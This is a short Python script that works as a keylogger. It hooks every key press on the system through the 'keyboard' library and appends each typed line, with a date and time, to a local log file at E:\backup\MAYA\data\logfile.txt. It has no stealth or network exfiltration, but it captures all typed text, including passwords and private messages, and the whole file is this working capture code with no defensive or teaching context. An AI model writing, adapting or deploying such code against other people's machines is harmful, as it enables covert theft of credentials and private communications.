import keyboard
import datetime

alpha = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
         'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
         'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
         'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
         'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
         'Y', 'Z']
symbols = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '-', '+', '=',
           '{', '}', '[', ']', ':', ';', '"', ',', '.', '/', '|', '<', '>', '?',
           '`', '~']

stringLine = ''


def on_key_press(e):
    global stringLine

    current_datetime = datetime.datetime.now()
    formatted_date = current_datetime.strftime("%Y-%m-%d %H:%M:%S")

    if e.event_type == keyboard.KEY_DOWN:
        if e.name == 'space':
            stringLine += ' '
        elif e.name in alpha:
            stringLine += e.name
        elif e.name in symbols:
            stringLine += e.name
        elif e.name == 'up' or e.name == 'down' or e.name == 'left' or e.name == 'right':
            stringLine += ''  # You can add specific handling for arrow keys if needed
        elif e.name == 'backspace' or e.name == 'delete' or e.name == 'alt' or e.name == 'tab':
            # Implement backspace logic if needed
            stringLine += ''
        elif e.name == 'enter':
            sanitized_timestamp = datetime.date.today()
            current_time = datetime.datetime.now().strftime("%I:%M:%S %p")
            filename = f'E:\\backup\\MAYA\\data\\logfile.txt'
            print(f"string saved in file as : {stringLine}")
            with open(filename, 'a') as file:
                file.write(f'> string data {sanitized_timestamp} && {current_time} :: {stringLine}\n')
            stringLine = ''

        else:
            stringLine += f" ['{e.name}'] "


# Set up a callback for key press events
keyboard.on_press(on_key_press)

# Keep the program running
keyboard.wait(0)
# You can change '0' to any key you want to use for stopping the program.
